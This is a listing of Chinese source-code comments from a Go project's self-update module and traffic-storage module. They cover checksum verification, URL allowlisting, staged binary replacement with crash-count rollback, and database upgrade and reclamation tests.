+878 source/selfupdate/selfupdate_test.go:131 // 校验和写好之后再改动文件，模拟下载损坏 / 被掉包。
+879 source/selfupdate/selfupdate_test.go:141 // 能执行但退出码非 0
+880 source/selfupdate/selfupdate_test.go:176 // 标记必须留着，下一次启动（跑的是新版）靠它计数、必要时回滚。
+881 source/selfupdate/selfupdate_test.go:187 // 破坏校验和
+882 source/selfupdate/selfupdate_test.go:208 // 上一轮升级留下的备份
+883 source/selfupdate/selfupdate_test.go:229 // 前 maxAttempts 次启动只累计计数，让新版有机会自己站稳。
+884 source/selfupdate/selfupdate_test.go:245 // 再崩一次就超限，自动把旧版换回来。
+885 source/selfupdate/selfupdate_test.go:259 // 起不来的那个版本留作排查，不直接删。
+886 source/selfupdate/selfupdate_test.go:271 // Rollback() 走 ResolvePaths()，这里直接测底层的交换语义。
+887 source/selfupdate/selfupdate_test.go:295 // sha256sum 输出是双空格分隔；shasum -a 256 在二进制模式下会给文件名加 *。
+888 source/selfupdate/selfupdate_test.go:299 // 恰好两个字段，但第一个不是摘要
+889 source/selfupdate/selfupdate_test.go:300 // 摘要长度不对
+890 source/selfupdate/selfupdate_test.go:306 // 摘要统一小写，比对时才不会因大小写误判为不匹配。
+891 source/selfupdate/selfupdate_test.go:327 // 真实发布包的结构：artex-<版本>-<os>-<arch>/artex，外加若干干扰文件。
+892 source/selfupdate/selfupdate_test.go:383 // 非 HTTPS
+893 source/selfupdate/selfupdate_test.go:384 // 域名不在白名单
+894 source/selfupdate/selfupdate_test.go:385 // 后缀伪装
+895 source/selfupdate/selfupdate_test.go:397 // 域名大小写不敏感
+896 source/selfupdate/selfupdate_test.go:408 // build.sh 的 package_binary 用的是 artex-<版本>-<os>-<arch>.zip，且版本号
+897 source/selfupdate/selfupdate_test.go:409 // 去掉了 v 前缀。这里对错一个字符，所有平台的一键更新都会找不到资产。
+898 source/selfupdate/selfupdate_test.go:441 // 标记没了，后续正常重启就不会再累计次数、也不会误触发回滚。
+899 source/selfupdate/selfupdate_test.go:445 // 备份要留着，用户还能手动回滚。
+900 source/selfupdate/selfupdate_test.go:455 // 普通启动路径，不该 panic 也不该动任何文件
+901 source/selfupdate/stage.go:18 // sumsAsset 是 release.yml 生成的校验和清单，覆盖 Release 里全部 zip。
+902 source/selfupdate/stage.go:21 // maxBinarySize 限制解压出来的二进制体积，防止畸形 zip 把磁盘写满。
+903 source/selfupdate/stage.go:24 // Phase 是升级过程中的阶段，直接用作 SSE 事件里的 phase 字段。
+904 source/selfupdate/stage.go:36 // Progress 由调用方提供，用来把进度推给前端。pct 仅在下载阶段有意义（0-100），
+905 source/selfupdate/stage.go:37 // 其余阶段传 -1。
+906 source/selfupdate/stage.go:40 // Stage 下载指定 Release 的当前平台发布包，校验后把新二进制暂存为 artex.new。
+907 source/selfupdate/stage.go:42 // 走的是完整 zip 而不是裸二进制，理由有两个：现有 Release 的 SHA256SUMS 本来就
+908 source/selfupdate/stage.go:43 // 只覆盖 zip，走 zip 不需要改 CI，也能兼容已经发布出去的历史版本；zip 里还带着
+909 source/selfupdate/stage.go:44 // skills/，为将来同步内置 skill 留了口子。代价只是多下载 skills 那几百 KB。
+910 source/selfupdate/stage.go:46 // 函数返回即代表暂存完成，调用方随后优雅关闭并以 ExitRestart 退出。
+911 source/selfupdate/stage.go:80 // 临时文件全部落在目标目录里，保证最后的 rename 是同一文件系统内的原子操作
+912 source/selfupdate/stage.go:81 // （跨设备 rename 会失败，而 /tmp 常常是独立挂载点）。
+913 source/selfupdate/stage.go:108 // 暂存件自己的 sha256 单独存一份：下次启动换装前还要再校验一次，
+914 source/selfupdate/stage.go:109 // 防止暂存后到重启前这段时间里文件被改动或写坏。
+915 source/selfupdate/stage.go:127 // 标记只影响自动回滚能力，暂存件本身已就位，不因此中断升级。
+916 source/selfupdate/stage.go:135 // fetchSums 下载并解析 SHA256SUMS，返回 文件名 → 十六进制摘要。
+917 source/selfupdate/stage.go:158 // parseSums 解析 sha256sum 风格的清单，返回 文件名 → 十六进制摘要。
+918 source/selfupdate/stage.go:160 // 第一个字段必须是 64 位十六进制才收录。只按"恰好两个字段"判断是不够的——
+919 source/selfupdate/stage.go:161 // 任意一行两个单词的说明文字都会被当成合法条目，把垃圾值塞进摘要表，
+920 source/selfupdate/stage.go:162 // 真正的资产反而可能匹配到错误的摘要。
+921 source/selfupdate/stage.go:166 // 格式为 "<sha256>  <filename>"（sha256sum 用双空格；shasum 的二进制
+922 source/selfupdate/stage.go:167 // 模式会给文件名加 * 前缀）。
+923 source/selfupdate/stage.go:195 // download 把资产写入 dst，同时计算 SHA256 并按 Content-Length 汇报进度。
+924 source/selfupdate/stage.go:223 // get 发起一个受白名单约束的 GET，返回响应体。
+925 source/selfupdate/stage.go:244 // extractBinary 从发布包里取出 artex 可执行文件。
+926 source/selfupdate/stage.go:246 // 包内结构是 artex-<版本>-<os>-<arch>/artex，但这里按**基名**匹配而不是拼完整
+927 source/selfupdate/stage.go:247 // 路径：版本号在包名里出现过一次，拼错一个字符就整个升级失败，按基名找更耐改。
+928 source/selfupdate/stage.go:290 // checkWritable 提前确认目录可写。没有这一步，非 root 运行、或二进制被放在系统
+929 source/selfupdate/stage.go:291 // 目录时，会在下载完几十 MB 之后才在换装那一刻失败。
+930 source/selfupdate/stage.go:303 // progressWriter 统计已写字节并限频汇报，避免每个 32KiB 分块都推一条 SSE。
+931 source/traffic/reclaim_test.go:54 // 回收在后台分块进行
+932 source/traffic/reclaim_test.go:145 // 必须收敛，不能卡在预算里
+933 source/traffic/traffic.go:1272 // 归档路径即使一个历史 host 目录都没有(新装机的流量只落在 SQLite + _blobs)
+934 source/traffic/traffic.go:1273 // 也必须留下 journal：崩溃点若落在 PostgreSQL 提交与 SQLite 提交之间，重启后
+935 source/traffic/traffic.go:1274 // SQLite 事务被回滚，只有这份 journal 能让恢复流程补做 host 行的删除。少了它，
+936 source/traffic/traffic.go:1275 // 已转冷任务的独占流量会永久留在热库里。
+937 source/traffic/traffic.go:2040 // 精简为最小索引：仅保留定位所需字段 + 响应码/长度，不带任何响应内容。
+938 source/traffic/upgrade_test.go:44 // 三条历史流量，含一条 legacy path<>'' 的行
+939 source/traffic/upgrade_test.go:70 // ---- 新版本接管
+940 source/traffic/upgrade_test.go:77 // 1. 必须是同一个文件，不能悄悄开了个新空库
+941 source/traffic/upgrade_test.go:89 // 2. 历史数据全部可见
+942 source/traffic/upgrade_test.go:94 // 3. 历史全文索引仍可搜
+943 source/traffic/upgrade_test.go:104 // 4. 历史正文仍可读
+944 source/traffic/upgrade_test.go:110 // 5. 旧库不会被误判为已启用增量回收
+945 source/traffic/upgrade_test.go:114 // 6. 删除仍然正常工作，且回收流程在旧库上能收敛
+946 source/traffic/upgrade_test.go:123 // 7. legacy path<>'' 的行没被牵连
+947 source/traffic/upgrade_test.go:151 // 旧版本二进制接管
